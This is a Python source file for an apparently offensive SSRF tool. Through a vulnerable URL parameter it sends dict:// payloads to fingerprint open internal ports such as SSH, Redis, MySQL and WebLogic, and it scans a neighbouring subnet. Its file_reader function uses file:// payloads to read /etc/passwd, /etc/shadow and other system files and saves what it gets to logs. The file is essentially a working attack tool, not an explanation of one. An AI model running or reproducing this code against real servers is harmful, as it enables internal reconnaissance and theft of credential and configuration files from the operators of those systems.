#encoding : utf-8

from lib.common import get_requests
import time,requests, hashlib, threading,queue
from lib.config import logging, out_put

#scan open ports
#22 port ssh-sevice, 80 port http-server, 445 port smtp-server, 3306 port-server, 6379 port redis-server, 7001 port weblogic-console, 8080 port tomcat\jobss-server, 11211 port memcache-server

#try use conn_time to judge
'''
class Scan(object):
    def __init__(self,target,parameter):
        self.target = target
        self.parameter = parameter
        self.ports = [22,80,445,3306,6379,7001,8080,11211]
        #self.ports = [22,80]
        self.open_port = []
        #self.time_out = self._time_limit()

    def _time_limit(self):
        url = "{url}?{query}=ftp://127.0.0.1:80".format(url=self.target,query=self.parameter)
        r = requests.get(url)
        time_out = float(r.elapsed.microseconds)
        print(time_out)
        return time_out

    def _port_open(self):
        time_out = 66522.0
        for port in self.ports:
            payload = "{url}?{query}=dict://127.0.0.1:{port}".format(url=self.target, query=self.parameter, port=port)
            print(payload)
            request_time = requests.get(payload).elapsed.microseconds
            print("port:{} time:{}".format(port, request_time))
            if request_time <= time_out:

                self.open_port.append(port)

        return list(set(self.open_port))
'''

#use hash of content to judge
class Scan(object):
    def __init__(self, target, parameter,ip='',queue=''):
        self.target = target
        self.parameter = parameter
        self.ports = [22, 80, 445, 3306, 6379, 7001, 8080, 11211]
        self.hash = hashlib.md5()
        self.ip = ip
        self.queue = queue

    #when the port is not exist,use dict protocol to get the hash of content
    def hash_limit(self):
        payload = "{url}?{query}=dict://127.0.0.1:{port}".format(url=self.target, query=self.parameter, port=0)
        limit_conn = get_requests(payload).text
        if limit_conn:
            self.hash.update(limit_conn.encode('utf-8'))
            return self.hash.hexdigest()
        else:
            return False

    #judge the open port,default is host
    def _open_port(self,ip=''):
        hash_judge = []
        open_port = []

        if ip:
            pass
        else:
            ip = '127.0.0.1'

        logging.info("Starting detect open ports in ip:{}.....".format(ip))
        for port in self.ports:
            hash_values = {}
            payload = "{url}?{query}=dict://{ip}:{port}".format(url=self.target, query=self.parameter, ip=ip, port=port)
            #print(payload)
            port_conn = get_requests(payload).text
            if port_conn:
                self.hash.update(port_conn.encode('utf-8'))
                hash_values['port'] = port
                hash_values['hash'] = self.hash.hexdigest()
                hash_judge.append(hash_values)
            else:
                pass
        #print(hash_judge)

        hash_limit_value = self.hash_limit()
        if hash_limit_value:
            for i in hash_judge:
                if hash_limit_value != i['hash']:
                    open_port.append(i['port'])
        else:
            for j in hash_judge:
                open_port.append(j['port'])

        return list(set(open_port))

    def host_port(self):
        while True:
            if self.queue.empty():
                break
            try:
                ip = self.queue.get_nowait()
                ip_port = self._open_port(ip=ip)
                if ip_port:
                    out_put(self.target,'host_port.log',ip_port)
                    logging.info("the {} found open port is: {}".format(self.ip, ip_port))
            except requests.exceptions.ReadTimeout:
                pass
            except requests.exceptions.ConnectTimeout:
                pass
            except Exception as e:
                break

def run(target,parameter,ip_c=''):

    threads_count = 20
    threads = []
    Queue = queue.Queue()

    open_port = Scan(target, parameter)._open_port()
    out_put(target, 'host_port.log', open_port)
    logging.info("127.0.0.1 host found open port is: {}".format(open_port))

    if ip_c:
        logging.info("Starting to detct the other ip ....")
        for d in range(105,106):
            ip = '{0}.{1}'.format(ip_c, d)
            Queue.put(ip)

        for i in range(threads_count):
            t = threading.Thread(target=Scan(target, parameter, queue=Queue).host_port())
            t.start()
            t.join()
            '''
            threads.append(Scan(target, parameter, queue=Queue).host_port())
            
        for t in threads:
            t.start()
        for t in threads:
            t.join()
            '''

#use file to get file content
def file_reader(target,parameter):
    content = []
    get_file = []
    paths = ['/etc/rsyslog.conf','/etc/syslog.conf','/etc/passwd','/etc/shadow','/etc/group','/etc/anacrontab','/etc/networks','/etc/hosts']
    logging.info("Use the protocol to get the contents of the file.....")
    for path in paths:
        payload = "{url}?{query}=file://{path}".format(url=target, query=parameter, path=path)
        file_content = get_requests(payload)
        if file_content:
            content.append(file_content.text.strip())
            get_file.append(path)
        else:
            pass

    if content:
        logging.info("Save file content: {}".format(get_file))
        out_put(target,'file_content.log',list(set(content)))

